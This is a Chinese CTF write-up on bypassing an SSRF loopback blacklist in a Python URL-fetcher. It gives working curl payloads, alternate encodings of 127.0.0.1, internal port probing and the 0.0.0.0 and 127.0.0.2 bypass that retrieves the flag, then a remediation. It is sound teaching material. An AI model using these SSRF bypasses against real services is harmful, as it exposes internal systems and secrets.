---
title: "N1BOOK - Python里的SSRF"
date: 2026-09-11
categories:
  - CTF
  - WEB
tags:
  - CTF
  - SSRF
  - Python
  - 黑名单绕过
  - 0.0.0.0
---

# 1. 题目分析

**题目地址**：`http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com/`

**题目提示**：尝试访问到容器内部的 8000 端口和 url path `/api/internal/secret` 即可获取 flag。

**初始访问**：

```bash
curl -s -i "http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com/"
```

```
HTTP/1.1 200 OK
Server: openresty
Date: Fri, 11 Sep 2026 08:20:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 25
Connection: keep-alive
Cache-Control: no-cache

url parameter is required
```

## 关键信息提取

| 线索 | 说明 |
|------|------|
| `Server: openresty` | 前端是 OpenResty（Nginx + Lua），通常做反向代理，后端另有服务 |
| `url parameter is required` | 应用接收一个 **`url` 参数**，这是典型的 **URL 代理 / 抓取（Fetcher）** 功能 |
| `Content-Type: text/html` 但内容纯文本 | Flask 风格（无 HTML 包装），提示后端是 Python |

**推理**：题目名「Python 里的 SSRF」+ 存在 `url` 参数 → 后端是 Python `requests` 实现的 URL 抓取接口，存在 **SSRF（服务端请求伪造）**。

验证一下：

```bash
curl -s -G --data-urlencode "url=http://example.com" "http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com/"
```

成功返回 Example Domain 页面 → **SSRF 漏洞确认**（完整判定过程见 3.1 节）。

### curl 参数说明

本题**所有请求都使用这个命令模板**，先把参数含义交代清楚，后面不再重复：

```bash
curl -s -G --data-urlencode "<参数名>=<值>" "http://TARGET/<路径>"
```

| 参数 | 全称 | 作用 | 不加会怎样 |
|------|------|------|-----------|
| `curl` | — | 命令行 HTTP 客户端 | — |
| `-s` | `--silent` | 静默模式：不输出进度条、不打印错误提示，**只返回响应体** | 输出里会混进 `% Total  % Received ...` 进度条和连接信息，污染 WP 记录，脚本里也难以解析 |
| `-G` | `--get` | **把后面的 `--data-urlencode` 数据当作 query string 拼到 URL 后面，并用 GET 方法发送** | `--data-urlencode` 默认走 **POST body** → 本题实测返回 **405 Method Not Allowed**（接口只接受 GET） |
| `--data-urlencode "url=http://example.com"` | — | 把 `key=value` 中的 **value 做 URL 编码**后拼进 query string：`http://example.com` → `url=http%3a%2f%2fexample.com` | 见下方「为什么不能手写 `?url=`」 |
| `"http://TARGET/"` | — | 真正请求的目标（CTF 靶机地址） | — |

**引号不能省**：`"url=http://example.com"` 整体用双引号包住，是因为 shell 里 `?`、`&`、`#`、`;` 都是**元字符**。不加引号会被 shell 抢先解析（例如 `&` 会把命令切到后台执行），传给 curl 的值就不完整了。

**为什么不能手写 `?url=http://example.com`？**

因为目标 URL 里含大量 **URI 保留字符**，不做编码会被服务端 / 中间件按自己的规则切分：

| 字符 | 会被误解成 |
|------|-----------|
| `:` | 端口分隔符（`http://a.com:8000` 里的 `:`） |
| `/` | 路径分隔符（中间件可能据此改变路由匹配结果） |
| `?` | 参数起始符（后面内容被当成新参数） |
| `&` | 参数分隔符（值被截断） |
| `#` | fragment（`#` 之后的内容**根本不会发给服务端**） |

URL 编码后这些字符变成 `%3a` `%2f` `%3f` `%26` `%23`，服务端解码后才能拿到**完整的一个字符串值**。

**等价写法对比**：

```bash
# ① 推荐：让 curl 自动编码（可读性好，不易出错）
curl -s -G --data-urlencode "url=http://127.0.0.1:8000/api/internal/secret" "http://TARGET/"

# ② 手工编码（效果完全一样，但写法容易出错）
curl -s "http://TARGET/?url=http%3a%2f%2f127.0.0.1%3a8000%2fapi%2finternal%2fsecret"
```

**本 WP 后续会用到的其他 curl 参数**：

| 参数 | 作用 | 用在哪 |
|------|------|--------|
| `-i` | 连同**响应头**一起输出 | 判断是 `200 OK` 还是 `302 Location`（3.1.2 节，区分 SSRF 与开放重定向） |
| `-v` | 输出**请求全过程**（DNS、TCP、请求行、请求头） | 证明本地 curl 从未连接过目标站（3.1.2 节） |
| `-o /dev/null` | 丢弃响应体 | 只关心状态码时 |
| `-w "%{http_code}"` | 只输出 HTTP 状态码 | 批量探测路径是否存在（2.1 节） |
| `--max-time N` | 最多等 N 秒后放弃 | 靶机后端超时只有 2 秒（抓外网会挂起），本地加超时防卡死 |

# 2. 信息收集

## 2.1 目录 / 路径枚举

```bash
for p in "" "index" "api" "robots.txt" "flag" "source" "app.py" "main.py" "health"; do
  printf "%-12s -> " "/$p"
  curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/$p"
done
```

```
/            -> 200
/index       -> 404
/api         -> 404
/robots.txt  -> 200   ← 有内容
/flag        -> 404
/source      -> 404
/app.py      -> 404
/main.py     -> 404
/health      -> 200
```

## 2.2 robots.txt 泄露

```bash
curl -s "http://TARGET/robots.txt"
```

```
User-agent: *
Disallow: /static/secretkey.txt
```

但直接访问 `/static/secretkey.txt` 返回 **404**（OpenResty 层直接拦截或文件本就不存在）——这是一个**干扰项**，指向另一个挑战（通常用于签到题/密钥题），本题不需要。

## 2.3 探测内网服务指纹

通过 SSRF 请求内网端口，**报错信息直接把后端技术栈全部吐了出来**：

```bash
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/" "http://TARGET/"
```

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
...
```

→ **Werkzeug/Flask 的 404 页面**，确认内网 8000 端口跑的是 **Flask 应用**。

```bash
curl -s -G --data-urlencode "url=http://127.0.0.2:22/" "http://TARGET/"
```

```
('Connection aborted.', BadStatusLine('SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2\r\n'))
```

→ 内网还开着 **SSH(22)**，系统是 **Debian 10**。

```bash
curl -s -G --data-urlencode "url=http://example.com:8000/api/internal/secret" "http://TARGET/"
```

```
HTTPConnectionPool(host='example.com', port=8000): Read timed out. (read timeout=2)
```

→ 后端使用 **Python `requests` 库**（`HTTPConnectionPool` 是 urllib3 的报错），且设置了 **2 秒超时**。
**注意**：报错中**回显了请求的 host**，这意味着客户端拿到的是原始异常字符串——这是后续判断「过滤器在请求之前还是之后执行」的重要依据。

# 3. 漏洞分析

## 3.1 SSRF 漏洞确认（两条命令坐实「服务端代取」）

很多人看到「传个 URL 就回显了内容」就直接下结论叫 SSRF，但这中间差着一个关键辨析：
**服务端是「代取并回显内容」（SSRF），还是只回了一个「跳转指示牌」（开放重定向）？**
下面把这个判定过程完整铺开。

### 3.1.1 命令模板与两个实测结论

命令沿用第 1 节的模板（参数逐项含义见 [1. 题目分析](#1-题目分析) 的「curl 参数说明」表）：

```bash
curl -s -G --data-urlencode "url=http://example.com" "http://20cf...dasctf.com/"
```

此处只补充与**判定逻辑**相关的两个实测结论：

**① `-G` 不能省 —— 实测证明接口只接受 GET**

```bash
# 不加 -G（POST）→ 405 Method Not Allowed
# 加 -G  （GET） → 200
```

说明后端这个接口**只接受 GET 传参**，参数必须出现在 query string 里。

**② 用 `--data-urlencode` 而非手写 `?url=` —— 保留字符会被截断**

用 `-v` 抓到的实际请求行，验证编码和拼接结果：

```bash
curl -s -v -G --data-urlencode "url=http://example.com" "http://TARGET/" -o /dev/null
```

```
*   Trying 198.18.0.177:80...                     ← 我们的 curl 只连了这一个 IP
* Connected to 20cf...dasctf.com (198.18.0.177)   ← 连的是靶机
> GET /?url=http%3a%2f%2fexample.com HTTP/1.1
> Host: 20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com
> User-Agent: curl/8.7.1
> Accept: */*
```

可以看到 `http://example.com` 已被编码为 `http%3a%2f%2fexample.com`，最终以 `?url=...` 的形式出现在请求行里。

**为什么要 URL 编码？** 因为 `http://example.com` 里含 `:  /  /` 这些保留字符。不编码直接写 `?url=http://example.com`，中间件/框架可能把 `:` 当端口分隔符、把 `/` 当路径、把 `&` 当参数分隔符，导致服务端拿到的 `url` 值不完整。用 `--data-urlencode` 才能保证它作为**一个完整字符串值**传递。

### 3.1.2 证据：服务端代取，而不是让我们跳转

加 `-i` 看完整响应头：

```bash
curl -s -i -G --data-urlencode "url=http://example.com" "http://TARGET/"
```

```
HTTP/1.1 200 OK                          ← 200，不是 302
Server: openresty
Date: Fri, 11 Sep 2026 08:27:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 559
Connection: keep-alive
Cache-Control: no-cache

<!doctype html><html lang="en"><head><title>Example Domain</title>...
<body><div><h1>Example Domain</h1><p>This domain is for use in
...</html>                                 ← 目标内容被【回显】在 body 里
```

**关键**：我们本地的 curl **从未连接过 example.com**（`-v` 已证明只连了靶机 IP），也**没有加 `-L`**（不跟随重定向）。那这份 HTML 是谁取回来的？

**答案只能是服务端**：靶机读了我们传的 `url` 参数，**在它自己的网络环境里**发了一次 `GET http://example.com`，然后把结果原样回显给我们。

> **「让服务器代替我们去发请求」——这就是 Server-Side Request Forgery（服务端请求伪造）。**

### 3.1.3 关键辨析：为什么不是「开放重定向」

这是最容易混淆的地方，也是判定 SSRF 的**金标准**：

```
┌──────────────── 如果是 Open Redirect（开放重定向）────────────────┐
│                                                                   │
│  我们:   GET /?url=http://example.com                             │
│  服务端: 302 Found                                                │
│          Location: http://example.com   ← 只是一个「指路牌」       │
│          (body 为空)                                              │
│                                                                   │
│  结果: 服务端【自己没去】example.com                                │
│        是我们的 curl/浏览器（加了 -L 时）才去请求的                 │
│        → 不是 SSRF                                                │
└───────────────────────────────────────────────────────────────────┘

┌──────────────────── 本题：SSRF（服务端请求伪造）──────────────────┐
│                                                                   │
│  我们:   GET /?url=http://example.com                             │
│  服务端: 读参数 → 在【服务端网络里】发 GET http://example.com       │
│          → 拿到 example.com 的 HTML                               │
│          → 200 OK + body 直接回显给我们                            │
│                                                                   │
│  结果: 我们的 curl 全程没碰 example.com                             │
│        内容却是服务端【代取】回来的                                  │
│        → 这就是 SSRF ✅                                            │
└───────────────────────────────────────────────────────────────────┘
```

**判定口诀**：

| 现象 | 结论 |
|------|------|
| `200 OK` + **目标站的内容出现在 body 里** | **SSRF** ✅ |
| `30x` + `Location: 目标站` + body 为空 | 开放重定向，**不是 SSRF** |

### 3.1.4 SSRF 确认的四个判定要素

这一条命令其实同时命中了 SSRF 的全部判定要素：

| 要素 | 本题证据 |
|------|---------|
| ① **参数可控** | `url=` 的取值完全由攻击者决定 |
| ② **服务端发起** | body 是目标内容，且是 200 而非 302（`-v` 证明我们从未连接 example.com） |
| ③ **目标可任意替换** | 换成 `127.0.0.1:8000` → `"127.0.0.1 is forbidden"`；换成 `example.com:8000` → `Read timed out`。说明**没有硬编码白名单**，具备打内网的能力 |
| ④ **有回显** | 目标响应内容 / 报错信息原样返回（回显型 SSRF，最好用；盲 SSRF 得靠 DNSLog 或时间盲注判定） |

第 ③ 点尤其重要——正因为目标可任意替换，才有后面 `http://0.0.0.0:8000/api/internal/secret` 打内网拿 flag 的下一步。

### 3.1.5 这段话在整条推理链中的位置

```
?url= 参数存在                    ← 信息收集：发现有抓取接口
        ↓
url=http://example.com 成功回显    ← 【本节】漏洞探测：SSRF 确认
        ↓                            同时确立：参数可控 + 服务端发起 + 有回显
url=http://127.0.0.1:8000/...     ← 利用：尝试直接打内网
        ↓
"127.0.0.1 is forbidden"          ← 遇到黑名单，转向绕过（3.3 节）
        ↓
url=http://0.0.0.0:8000/...       ← 绕过后拿到 flag
```

## 3.2 第一次尝试：直球访问内网

```bash
curl -s -G --data-urlencode "url=http://127.0.0.1:8000/api/internal/secret" "http://TARGET/"
```

```
127.0.0.1 is forbidden
```

**结论**：存在 **SSRF 黑名单过滤**，目标是阻断对内网 loopback 的访问。

## 3.3 推理链：过滤器到底在检查什么？

这是本题的**核心**。我按「黑名单匹配的粒度」逐层做假设-验证：

### 假设 A：过滤器只是简单的字符串黑名单，匹配 `"127.0.0.1"`

**验证**：构造不含该字符串、但语义等价于 127.0.0.1 的多种写法。

```bash
127.1:8000           -> 127.0.0.1 is forbidden
localhost:8000       -> 127.0.0.1 is forbidden
2130706433:8000      -> 127.0.0.1 is forbidden   # 127.0.0.1 的十进制整数形式
0x7f000001:8000      -> 127.0.0.1 is forbidden   # 十六进制形式
017700000001:8000    -> 127.0.0.1 is forbidden   # 八进制形式
127.0.0.1.nip.io:8000-> 127.0.0.1 is forbidden   # 通配 DNS 解析回 127.0.0.1
```

**关键观察**：报错信息**全部是 `127.0.0.1`**，而不是我们输入的原文（如 `127.1`、`2130706433`）。

> 说明过滤器**先把 host 归一化成了 IP，再与实际值比较**，输出的是归一化后的结果。

### 假设 B：过滤器把 host 做了 DNS/数值解析归一化

`gethostbyname()` 正是 glibc 提供的这种能力——它同时支持主机名解析和 inet_aton 风格的畸形 IP 解析。本地复现验证：

```bash
python3 -c "
import socket
for h in ['127.0.0.1','127.1','localhost','2130706433','0x7f000001','017700000001','0.0.0.0','0','0x0']:
    print(f'{h:>16} -> {socket.gethostbyname(h)}')
"
```

```
       127.0.0.1 -> 127.0.0.1
           127.1 -> 127.0.0.1
       localhost -> 127.0.0.1
      2130706433 -> 127.0.0.1
      0x7f000001 -> 127.0.0.1
    017700000001 -> 127.0.0.1
         0.0.0.0 -> 0.0.0.0     ← 注意这里！
               0 -> 0.0.0.0     ← 注意这里！
             0x0 -> 0.0.0.0     ← 注意这里！
```

**完全吻合所有观测结果**。过滤器逻辑基本可以还原为：

```python
import socket
from urllib.parse import urlparse

host = urlparse(user_url).hostname
ip = socket.gethostbyname(host)      # 归一化
if ip == "127.0.0.1":                # 精确等值比较
    return "127.0.0.1 is forbidden"
```

### 假设 C：既然是「精确等值比较」，那有没有能过检查、但实际仍打回本机的地址？

**有两个**：

1. **`127.0.0.2` / `127.0.0.3`** —— Linux 中整个 **`127.0.0.0/8` 都是本地回环**，不只是 `127.0.0.1`。归一化结果是 `127.0.0.2` ≠ `127.0.0.1`，绕过检查。

2. **`0.0.0.0`（及等价写法 `0`、`0x0`）** —— 归一化结果是 `0.0.0.0`，不等于 `127.0.0.1`，绕过检查。而 **在 Linux 中 `connect()` 到 `0.0.0.0` 会被内核解释为「本机」**，实际就是连到 `127.0.0.1`。

**验证**：

```bash
curl -s -G --data-urlencode "url=http://127.0.0.2:8000/api/internal/secret" "http://TARGET/"
# -> n1book{1132e28b5433c878}   ✅

curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/internal/secret" "http://TARGET/"
# -> n1book{1132e28b5433c878}   ✅

curl -s -G --data-urlencode "url=http://0:8000/api/internal/secret" "http://TARGET/"
# -> n1book{1132e28b5433c878}   ✅
```

## 3.4 漏洞原理图解

### 过滤器的黑名单缺陷

```
用户输入 url
     │
     ▼
urlparse(url).hostname          ← 取 host
     │
     ▼
socket.gethostbyname(host)      ← 归一化成点分十进制 IP
     │
     ▼
ip == "127.0.0.1" ?             ← 精确等值！不是网段判断！
     │
     ├── 相等 ──► "127.0.0.1 is forbidden"
     │
     └── 不等 ──► requests.get(url)   ← 真正发起请求时用的还是【原始 host】
```

**核心矛盾**：过滤器检查的是**归一化后的 IP**，但真正的请求用的是**原始 host 字符串**——两者之间存在的语义鸿沟就是绕过点。

### 为什么 `0.0.0.0` 会打到本机？

```
攻击请求：http://0.0.0.0:8000/api/internal/secret
┌──────────────────────────────────────────────────────────┐
│ 1. hostname = "0.0.0.0"                                  │
│ 2. gethostbyname("0.0.0.0") = "0.0.0.0"                  │
│ 3. "0.0.0.0" == "127.0.0.1" ? → False  →  检查通过 ✅      │
│ 4. requests.get("http://0.0.0.0:8000/...")                │
│       ↓ Linux 内核 connect(0.0.0.0:8000)                  │
│   实际等价于 connect(127.0.0.1:8000)  ❌ 打回本机！          │
│ 5. Flask 8000 端口返回 flag                                │
└──────────────────────────────────────────────────────────┘
```

### 为什么 `127.0.0.2` 也会打到本机？

```
Linux 回环网段：127.0.0.0/8   （不是单个 127.0.0.1！）
┌──────────────────────────────────────────────────────────┐
│ 1. hostname = "127.0.0.2"                                │
│ 2. gethostbyname("127.0.0.2") = "127.0.0.2"              │
│ 3. "127.0.0.2" == "127.0.0.1" ? → False  →  检查通过 ✅    │
│ 4. connect(127.0.0.2:8000)                               │
│       ↓ 任意 127.x.x.x 都绑定 lo 网卡                      │
│   实际命中本机 8000 端口的 Flask  ❌ 打回本机！              │
└──────────────────────────────────────────────────────────┘
```

### 容器拓扑

```
┌────────────────── 靶机环境 ──────────────────┐
│                                              │
│  ┌────────────┐        ┌──────────────────┐  │
│  │  OpenResty  │───────►│  Flask :8000     │  │
│  │  (Nginx)    │  proxy │                  │  │
│  └────────────┘        │  /?url=  ← SSRF   │  │
│         ▲              │  /api/internal/  │  │
│         │              │       secret → 🚩  │  │
│         │              └──────────────────┘  │
│         │                     ▲              │
│         │                     │              │
│  外部攻击者 ───────────────SSRF 打回本机───────┘
│  注意：代理服务和内网 API 是【同一个 Flask 应用】，
│        自打自 = 绕过所有网络边界
└──────────────────────────────────────────────┘
```

**额外发现**：把 `/?url=` 本身作为 SSRF 目标也能成立——

```bash
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/?url=http://example.com" "http://TARGET/"
# → 返回 Example Domain 页面（代理套代理，证明两者是同一进程）
```

# 4. 漏洞利用

## 4.1 最小 PoC — 证明能访问内网 loopback

```bash
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/" "http://TARGET/"
# 返回 "url parameter is required" → 证明 SSRF 已成功打回本机 8000
```

## 4.2 指定内网路径读取 Flag

```bash
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/internal/secret" \
  "http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com/"
```

```
n1book{1132e28b5433c878}
```

## 4.3 完整一键利用

```bash
TARGET="http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com"
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/internal/secret" "$TARGET/"
```

# 5. Flag

```
n1book{1132e28b5433c878}
```

获取方式：通过 `url` 参数发起 SSRF，用 `0.0.0.0` 替代被黑名单拦截的 `127.0.0.1`，请求容器内 8000 端口的 `/api/internal/secret` 接口。

# 6. 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 / 得到的结论 |
|------|------|---------|----------------------|
| 直接访问 `/robots.txt` 中的 `/static/secretkey.txt` | 拿到密钥 | **404** | 是干扰项；OpenResty 层未映射该路径 |
| 枚举 `/index`、`/api`、`/flag`、`/source`、`/app.py`、`/main.py` | 找到源码泄露 | 全部 **404** | 无源码泄露，必须走 SSRF |
| `?url=http://example.com` | 回显被抓取的内容 | 成功回显 | **SSRF 确认**（这是唯一入口） |
| `?url=http://127.0.0.1:8000/api/internal/secret` | 拿到 flag | `127.0.0.1 is forbidden` | 存在 **黑名单过滤**，主攻方向转向绕过 |
| `?url=http://127.1:8000/...` | 绕过字符串黑名单 | `127.0.0.1 is forbidden` | 过滤器**做了归一化**，不是字符串匹配 |
| `?url=http://localhost:8000/...` | 绕过 | `127.0.0.1 is forbidden` | 同上，DNS 名称也被解析 |
| `?url=http://2130706433:8000/...`（十进制） | 绕过 | `127.0.0.1 is forbidden` | 归一化涵盖整数/十六进制/八进制形式 |
| `?url=http://0x7f000001:8000/...`（十六进制） | 绕过 | `127.0.0.1 is forbidden` | 同上 |
| `?url=http://017700000001:8000/...`（八进制） | 绕过 | `127.0.0.1 is forbidden` | 同上 |
| `?url=http://127.0.0.1.nip.io:8000/...` | DNS 解析绕过 | `127.0.0.1 is forbidden` | 过滤在 DNS 解析**之后**，先解析再比对 |
| `?url=http://LOCALHOST:8000/...` | 大小写绕过 | `127.0.0.1 is forbidden` | 大小写无关（DNS 本就大小写不敏感） |
| `?url=http://[::1]:8000/...` | IPv6 绕过 | `[Errno -2] Name or service not known` | 容器未启用 IPv6 解析 |
| `?url=http://[::ffff:127.0.0.1]:8000/...` | IPv4-mapped IPv6 | `[Errno -2] Name or service not known` | 同上 |
| `?url=http://[::]:8000/...` | IPv6 通配 | `[Errno -2] Name or service not known` | 同上 |
| `?url=http://127.0.0.1.:8000/...`（尾部点） | 绕过 | `[Errno -2] Name or service not known` | 尾部点导致解析失败 |
| `?url=file:///etc/passwd` | 任意文件读取 | `empty hostname` | 代码强制要求 hostname，**只允许带主机的 URL**；`file://` 等无主机协议被排除 |
| `?url=http://0.0.0.0:80/` | 探测内网 80 端口 | `Max retries exceeded` | 内网 **80 端口无服务** |
| `?url=http://127.0.0.2:22/` | 探测 SSH | `SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2` | 22 端口开放，系统为 Debian 10（旁路信息，本题不需要） |
| `?url=http://0.0.0.0:3306/` | 探测 MySQL | `Max retries exceeded` | 3306 无服务 |
| `?url=http://0.0.0.0:8000/static/secretkey.txt` | 从内网取密钥 | **404** | 该文件确实不存在，`robots.txt` 是干扰项 |
| **`?url=http://0.0.0.0:8000/api/internal/secret`** | **绕过黑名单** | **`n1book{...}`** | ✅ **成功！`0.0.0.0` 不在 `127.0.0.1` 的等值判断里** |
| `?url=http://127.0.0.2:8000/...` | 换一种姿势 | `n1book{...}` | ✅ 同样成功（127/8 全段都是回环） |

**排除法价值**：这一堆「失败」的尝试共同**反推出了过滤器的实现方式**——如果 `127.1`、`2130706433`、`0x7f000001`、`localhost` 都被统一报告为 `127.0.0.1`，那必定存在归一化步骤；而既然是归一化后的**等值比较**，那么「归一化结果不等于 `127.0.0.1`、但实际连到本机」的地址就是天然的绕过点。

# 7. 知识点总结

## 7.1 技术点

### ① Python 中 host 的归一化行为（glibc `gethostbyname`）

| 输入形式 | 归一化结果 | 说明 |
|---------|-----------|------|
| `127.0.0.1` | `127.0.0.1` | 标准点分十进制 |
| `127.1` | `127.0.0.1` | inet_aton 缩写形式（a.b 补零） |
| `2130706433` | `127.0.0.1` | 32 位整数形式 |
| `0x7f000001` | `127.0.0.1` | 十六进制形式 |
| `017700000001` | `127.0.0.1` | 八进制形式 |
| `localhost` | `127.0.0.1` | hosts 文件解析 |
| **`0.0.0.0`** | **`0.0.0.0`** | **不在黑名单内！** |
| **`0` / `0x0`** | **`0.0.0.0`** | **同样绕过！** |

### ② `0.0.0.0` 的双重身份（本题关键）

- **作为监听地址**：`0.0.0.0` 表示「监听本机所有网卡」。
- **作为连接目标**：在 Linux 上 `connect()` 到 `0.0.0.0` **会被内核路由到本机 loopback**，效果等同于连 `127.0.0.1`。
- **作为过滤值**：很多黑名单只写 `127.0.0.1`，忘了 `0.0.0.0` —— 天然的绕过点。

### ③ `127.0.0.0/8` 整段都是回环

不要以为只有 `127.0.0.1` 是本机。Linux 中 **`127.0.0.0/8` 全部绑定 `lo` 网卡**，`127.0.0.2`、`127.0.0.3`、…… 都能访问本机服务。

### ④ SSRF 过滤的常见设计缺陷

| 缺陷 | 说明 | 本题是否踩中 |
|------|------|-------------|
| 精确等值 vs 网段判断 | 只比 `== "127.0.0.1"`，未判断整个 loopback 网段 | ✅ |
| 过滤与请求使用不同表示 | 检查用归一化 IP，请求用原始 host | ✅ |
| 忽视 `0.0.0.0` | 未把 `0.0.0.0` 纳入黑名单 | ✅ |
| 未做 DNS Rebinding 防护 | 解析一次后直接用原 host 请求（TOCTOU） | ✅ |
| 报错信息泄露 | 回显归一化后的 IP，直接暴露过滤器逻辑 | ✅ |
| 未限制端口 | 可扫描 22/3306/8000 等任意端口 | ✅ |
| 未禁用非 HTTP 协议 | 有 hostname 校验挡掉了 `file://`/`gopher://` | ❌ |

### ⑤ 报错信息是最强的信息源

`HTTPConnectionPool(host='example.com', port=8000): Read timed out. (read timeout=2)` 这一句同时泄露了：
- 后端库是 **requests/urllib3**
- **超时设为 2 秒**
- **请求的 host 原样拼进异常**（说明过滤器不会重写 URL）

## 7.2 修复建议

```python
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"http", "https"}

def safe_fetch(user_url):
    u = urlparse(user_url)

    # 1. 协议白名单
    if u.scheme not in ALLOWED_SCHEMES:
        raise ValueError("scheme not allowed")

    # 2. 必须携带 hostname
    if not u.hostname:
        raise ValueError("empty hostname")

    # 3. 解析所有 A/AAAA 记录并逐个校验
    infos = socket.getaddrinfo(u.hostname, None)
    for family, _, _, _, sockaddr in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        # ✅ 用 ipaddress 模块判断，而不是字符串等值比较
        if (ip.is_loopback or ip.is_private or ip.is_link_local
                or ip.is_multicast or ip.is_reserved or ip.is_unspecified):
            raise ValueError(f"{ip} is forbidden")

    # 4. 关键：真正请求时使用【已校验的 IP】，防止 DNS Rebinding (TOCTOU)
    #    生产环境推荐固定 IP + Host 头，或使用 http.client 直连
    return requests.get(user_url, timeout=2, allow_redirects=False)  # 还需关闭/校验重定向
```

**要点**：
1. 用 `ipaddress` 模块的 `is_loopback` / `is_private` / `is_unspecified` 等**属性判断**，杜绝字符串等值比较。
2. 必须把 `0.0.0.0`（`is_unspecified`）也拦住。
3. 校验完成后**固定 IP 再请求**，避免 DNS Rebinding（校验一次、请求时再解析一次 = TOCTOU 漏洞）。
4. 关闭重定向跟随（或对每一跳重新校验），否则可用 302 绕过。
5. 网络层兜底：用 iptables / 独立网络命名空间限制出站流量，别让应用层过滤成为唯一防线。
6. 生产环境不要回显原始异常信息。

# 8. 解题链路总结图

```
                  ┌─────────────────────────┐
                  │  访问目标 → "url parameter │
                  │  is required"            │
                  └────────────┬────────────┘
                               │
                    发现 ?url= 参数 = 抓取接口
                               │
                               ▼
                  ┌─────────────────────────┐
                  │ url=http://example.com   │
                  │ → 成功回显页面           │
                  │ ✅ SSRF 确认             │
                  └────────────┬────────────┘
                               │
              直球打内网 127.0.0.1:8000
                               │
                               ▼
                  ┌─────────────────────────┐
                  │ "127.0.0.1 is forbidden" │
                  │ ❌ 存在黑名单过滤         │
                  └────────────┬────────────┘
                               │
              尝试各种等价写法：127.1 / localhost
              2130706433 / 0x7f000001 / nip.io
                               │
                               ▼
                  ┌─────────────────────────┐
                  │ 全部报错 "127.0.0.1"      │
                  │ 🔍 关键推理：             │
                  │ 过滤器做了【归一化】+     │
                  │ 【等值比较】，不是字符串  │
                  └────────────┬────────────┘
                               │
              既然如此 → 找「归一化后 ≠ 127.0.0.1
              但实际连到本机」的地址
                               │
                 ┌─────────────┴─────────────┐
                 │                           │
                 ▼                           ▼
        ┌─────────────────┐        ┌─────────────────┐
        │ 0.0.0.0 / 0 /   │        │ 127.0.0.2 等     │
        │ 0x0             │        │ 127.0.0.0/8      │
        │ 归一化=0.0.0.0   │        │ 归一化≠127.0.0.1 │
        │ Linux 下等于连本机│        │ 整段都是回环      │
        └────────┬────────┘        └────────┬────────┘
                 │                           │
                 └─────────────┬─────────────┘
                               │
                               ▼
        ┌───────────────────────────────────────────┐
        │ url=http://0.0.0.0:8000/api/internal/secret│
        │ + 通过 robots.txt 探测出 /health 等信息    │
        │ + 通过报错指纹确认内网是 Flask(8000)       │
        └────────────────────┬──────────────────────┘
                             │
                             ▼
                    🚩 n1book{1132e28b5433c878}
                             │
                             ▼
                  溯源根因：过滤器只判断
                  ip == "127.0.0.1"，未使用
                  ipaddress.is_loopback 等网段判断，
                  且遗漏了 0.0.0.0 这一等价本机地址
```

## 一句话总结

> **过滤器的检查对象（归一化 IP）和请求的真正目标（原始 host）不一致，加上只做 `== "127.0.0.1"` 的等值比较、遗漏了 `0.0.0.0` 与整个 `127.0.0.0/8` 回环网段 —— 这就是本题的 SSRF 黑名单绕过点。**
